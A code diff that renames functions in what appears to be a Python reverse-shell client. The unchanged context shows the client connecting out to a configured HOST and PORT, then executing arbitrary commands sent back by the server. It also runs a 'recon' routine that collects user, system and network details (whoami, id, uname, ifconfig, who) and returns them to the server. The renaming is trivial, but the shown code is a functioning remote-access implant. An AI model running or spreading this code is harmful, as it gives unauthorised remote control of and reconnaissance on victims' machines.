@@ -39,7 +39,7 @@ def is_active(host, port):
     return False
 
 
-def ctrl_shell_client(host, port):
+def shell_client(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     while True:
@@ -50,9 +50,9 @@ def ctrl_shell_client(host, port):
             elif inp == 'getprompt':
                 socksend(s, get_prompt())
             elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                socksend(s, ctrl_shell_exec(inp))
+                socksend(s, shell_exec(inp))
             elif inp == 'recon':
-                socksend(s, ctrl_shell_recon())
+                socksend(s, shell_recon())
             elif inp.startswith('shell '):
                 socksend(s, cmd_exec(inp[6:]).strip())
             else:
@@ -65,7 +65,7 @@ def ctrl_shell_client(host, port):
     s.close()
 
 
-def ctrl_shell_exec(inp):
+def shell_exec(inp):
     out = ''
     cmds = parse_exec_cmds(inp)
     for cmd in cmds:
@@ -74,10 +74,10 @@ def ctrl_shell_exec(inp):
     return out
 
 
-def ctrl_shell_recon():
+def shell_recon():
     ipcmd = 'ip addr' if 'no' in cmd_exec('which ifconfig') else 'ifconfig'
     exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
-    return ctrl_shell_exec(exec_str)
+    return shell_exec(exec_str)
 
 
 def cmd_exec(cmd):
@@ -170,7 +170,7 @@ def main():
         while True:
             if is_active(HOST, PORT):
                 log.info('[+] ({}) Server is active'.format(datetime.now()))
-                ctrl_shell_client(HOST, PORT)
+                shell_client(HOST, PORT)
             else:
                 log.info('[!] ({}) Server is inactive'.format(datetime.now()))
             time.sleep(DELAY)
